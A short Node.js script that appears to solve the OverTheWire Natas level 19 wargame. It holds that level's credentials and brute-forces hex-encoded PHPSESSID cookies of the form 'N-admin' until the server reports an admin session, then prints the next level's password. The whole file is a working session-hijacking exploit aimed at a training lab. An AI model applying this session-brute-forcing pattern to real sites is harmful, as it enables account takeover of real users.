let username = 'natas19';
let password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs';

const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

for(var i = 1; i < 641; i++){
    let options = {
        uri: `http://${username}.natas.labs.overthewire.org`,
        method: 'POST',
        headers: {
            'Cookie': "PHPSESSID=" + ascii2hex(i + '-admin'),
        }
    }
    rp(options)
        .auth(username, password)
        .then($ => {
            if($.text().includes("You are an admin")){
                console.log($.text().trim().match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0])
            }
        });
}

function ascii2hex(ascii){
    return ascii
        .split('')
        .map(char => char.charCodeAt(0)
            .toString(16))
        .join('');
}

function hex2ascii(hex){
    return hex
        .match(/.{1,2}/g)
        .map(char => String
            .fromCharCode(parseInt(char, 16)))
            .join('');
}
